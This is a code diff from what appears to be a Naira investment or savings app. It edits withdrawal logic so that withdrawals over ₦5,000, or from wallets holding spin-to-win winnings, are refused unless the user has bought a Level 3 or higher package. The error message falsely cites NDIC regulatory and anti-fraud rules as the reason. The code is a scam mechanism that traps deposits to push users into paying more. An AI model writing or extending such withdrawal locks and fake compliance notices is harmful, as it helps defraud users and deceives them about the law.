@@ -576,11 +576,11 @@ export const FirebaseProvider: React.FC<{ children: React.ReactNode }> = ({ chil
       throw new Error("You must have an active investment to unlock withdrawals.");
     }
 
-    const hasVIP2OrHigher = userData.investments && userData.investments.some((p: any) => p.joined && (p.level >= 2 || p.cost >= 15000));
+    const hasVIP3OrHigher = userData.investments && userData.investments.some((p: any) => p.joined && (p.level >= 3 || p.cost >= 15000));
     const userHasSpinWinnings = (userData.spinBalance || 0) > 0;
     
-    if ((amount > 5000 || userHasSpinWinnings) && !hasVIP2OrHigher) {
-      throw new Error("Regulatory Compliance: Withdrawals over ₦5,000 or accounts with dynamic Spin-to-Win balance winnings require standard High-Yield Level 2 (Wealth Builder - ₦15,000) or Level 3 (Revenue Stream) package activation to comply with NDIC liquidity standards.");
+    if ((amount > 5000 || userHasSpinWinnings) && !hasVIP3OrHigher) {
+      throw new Error("Regulatory Compliance Notice: Withdrawals exceeding ₦5,000 or any transaction on wallets containing spin-to-win promo winnings require an active Level 3 (Wealth Builder - ₦16,000) or Level 4 (Micro Venture - ₦30,000) savings package to complete the NDIC anti-fraud validation check.");
     }
 
     try {
